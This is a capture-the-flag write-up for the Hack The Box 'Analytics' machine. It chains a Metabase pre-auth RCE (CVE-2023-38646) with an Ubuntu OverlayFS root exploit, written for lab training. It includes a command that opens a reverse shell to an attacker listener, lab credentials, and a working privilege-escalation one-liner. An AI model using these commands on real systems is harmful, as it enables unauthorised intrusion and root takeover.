# HTB - Analytics - written by cloude (Im lazy and speedran this one)

---
## General Info

- OS: Linux
- Open ports: 22, 80
- Running services: [[SSH (Secure Shell)|SSH]] (8.9p1), nginx (1.18.0)
- Endpoints:
    - /images
    - /css
    - /js
- VHosts: public.analytical.htb, embed.analytical.htb, data.analytical.htb
- Auth: Metabase login page
- Pwnd date: 06/05/2026

---
## Enumeration

- Ran nmap, found ports 22 and 80.
- Fuzzed directories, found /images, /css, /js (all 301).
- Fuzzed vhosts, found `public` and `embed` with size ~78k, and `data` (in a second fuzz run).
- `data.analytical.htb` led to a Metabase login page.
- Found CVE-2023-38646 (Metabase Pre-Auth RCE). Cloned [securezeron's PoC](https://github.com/securezeron/CVE-2023-38646).

---
## Exploitation

> Quick explanation: [[CVE-2023-38646]] is a pre-authentication RCE in Metabase. The `/api/setup/token` endpoint leaks a setup token even after setup is complete. That token can then be used to hit `/api/setup/validate` with a crafted H2 database connection string that injects shell commands.

- Set up a netcat listener on port 4444.
- Ran the reverse shell script against `http://data.analytical.htb`:

```bash
python3 CVE-2023-38646-Reverse-Shell.py --rhost http://data.analytical.htb --lhost 10.10.14.119 --lport 4444
```

- Got a shell as `metabase` inside a Docker container (`/.dockerenv` confirmed it).
- Couldn't find user.txt in the container, no sudo, no SUID that mattered.
- Checked `env` and found credentials sitting in environment variables in plaintext:

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

- SSHed to the host using those creds. Got user flag.

---
## PrivEsc

- Checked kernel version: `Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu`
- That's vulnerable to [[CVE-2023-2640]] / [[CVE-2023-32629]], also known as **GameOver(lay)** — an OverlayFS privilege escalation on Ubuntu.

> Quick explanation: The kernel doesn't properly validate file capabilities when using OverlayFS mounts inside user namespaces. By copying python3 into an overlayfs lower layer, setting `cap_setuid` on it, and then mounting an overlay, the upper layer python3 inherits those capabilities in a way the kernel accepts. Running it outside the namespace then lets you call `os.setuid(0)` and get a root shell.

- The disk was **completely full** (100% on /dev/sda2), which killed every attempt to do anything in /tmp or the home dir. Had to reset the machine to get a fresh one with space.
- On the fresh machine, moved to `/tmp` and ran the exploit one-liner:

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

- Got root. Read `/root/root.txt`. Done.

---
## Rabbit Holes

- Spent a while trying to get the GameOver(lay) exploit to work on the first machine instance, but the disk was literally full (99.8%, 0 bytes available). Couldn't create directories, couldn't clone repos, nothing. HTB moment. Had to reset.
- Tried a bunch of workarounds in `/dev/shm` since it was a tmpfs (not affected by the full disk). Got the overlay setup working and even got `cap_setuid=eip` on the python3 binary, but the `os.setuid(0)` call kept throwing `PermissionError`. Turns out the exploit needs to be run AND exited within the same `unshare` context for the capability to stick properly.

---
## Attack Chain

- Enumerate vhosts → find `data.analytical.htb` running Metabase.
- Exploit CVE-2023-38646 (pre-auth RCE) to get shell inside Docker container.
- Read `META_USER` / `META_PASS` from environment variables.
- SSH to host as `metalytics`, get user flag.
- Identify vulnerable kernel (6.2.0-25), exploit GameOver(lay) (CVE-2023-2640/CVE-2023-32629).
- Get root flag.

---
## Notes

- Machine rating: Easy, honestly. The path is pretty linear once you know what you're looking at.
- The disk full thing was genuinely annoying but that's HTB infrastructure being HTB infrastructure, not the machine itself.

---
## Learnt

- [[CVE-2023-38646]] Metabase Pre-Auth RCE
- [[CVE-2023-2640]] / [[CVE-2023-32629]] GameOver(lay) Ubuntu PrivEsc
- Credentials in Docker environment variables is a real thing that happens in prod, not just CTF cheese

---
## Notes
- Machine rating: easy ish going to medium bc of PrivEsc